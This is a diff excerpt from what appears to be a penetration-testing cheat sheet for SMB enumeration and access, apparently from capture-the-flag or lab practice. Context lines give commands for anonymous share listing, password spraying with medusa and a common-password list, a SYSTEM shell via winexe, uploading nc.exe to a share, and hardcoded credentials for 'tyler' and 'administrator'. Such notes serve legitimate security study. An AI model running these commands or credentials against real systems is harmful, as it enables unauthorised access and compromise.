@@ -193,15 +193,16 @@ retr 1
 rpcinfo -p ${PWD##*/}
 
 #SMB 139/445
-smbmap -H ${PWD##*/} -u anonymous -R
 CME - Run as Root
 cme smb ${PWD##*/} -u '' -p '' --shares
 cme smb ${PWD##*/} -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
 cme smb ${PWD##*/} -u users.txt -p passwords.txt --shares --continue-on-success
 medusa -h ${PWD##*/} -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
+smbclient -L \\\\[ip]
 smbclient -N -L ${PWD##*/}
 winexe -U username //${PWD##*/} "cmd.exe" --system
 mount -t cifs '//${PWD##*/}/new-site' smb -v -o user=tyler
+smb://[putinip]/ (from file manager)
 umount smb
 smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //${PWD##*/}/new-site -c 'put nc.exe nc.exe'
 smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\${PWD##*/}\\c$
